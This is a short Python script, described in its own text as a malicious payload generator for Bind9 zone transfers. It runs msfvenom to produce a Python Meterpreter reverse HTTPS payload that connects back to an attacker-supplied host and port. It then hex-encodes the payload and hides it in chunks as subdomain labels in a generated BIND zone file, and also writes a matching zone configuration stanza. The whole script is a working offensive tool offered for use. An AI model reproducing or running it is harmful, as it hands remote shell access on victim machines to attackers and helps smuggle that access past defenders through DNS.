#!/usr/bin/env python3.6

import argparse
import subprocess
import os

parser = argparse.ArgumentParser(description='Bind9 zone transfer malicious payload generator')
parser.add_argument('-d', '--domain', type=str, required=True, help='domain name for which configuration will be generated')
parser.add_argument('-a', '--ip', type=str, required=True, help='ip name of generated domain')
parser.add_argument('-s', '--soa-entries', type=str, required=True, help='soa entries')
parser.add_argument('-n', '--ns-server', type=str, required=True, help='nameserver domain')
parser.add_argument('-o', '--output-file', type=str, required=True, help='output file name')
parser.add_argument('-l', '--lhost', type=str, required=True, help='local host address (remote address will connect on it)')
parser.add_argument('-p', '--lport', type=str, required=True, help='local port (remote address will connect on it)')
args = parser.parse_args()

def chunkstring(string, length):
    return [string[0+i:length+i] for i in range(0, len(string), length)]

def msfvenom(lhost, lport):
    result = subprocess.run(["msfvenom", "-p", "python/meterpreter/reverse_https", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    print(result.stdout)
    return result.stdout

payload = msfvenom(args.lhost, args.lport).split(b"'")[3].hex()
chunks = chunkstring(payload, 63)

with open(args.output_file, "w") as output_file:
  output_file.write(f''';
; BIND data file for local loopback interface
;
$TTL	604800
@	IN	SOA	{args.soa_entries}. admin.{args.domain}. (
			      2		; Serial
			     60		; Refresh
			     60 		; Retry
			     60		; Expire
			   4800 )	; Negative Cache TTL
;
@	IN	NS	{args.ns_server}.
@	IN	A	{args.ip}
@	IN	AAAA	::1
{os.linesep.join(f'{i}.{chunk}	IN	A	127.0.0.1' for i, chunk in enumerate(chunks))}
''')

with open(f'{args.output_file}.install', 'w') as install_file:
    install_file.write(f'''
    zone "{args.domain}" {{
        type master;
        file "/etc/bind/out.conf";
    }};
''');
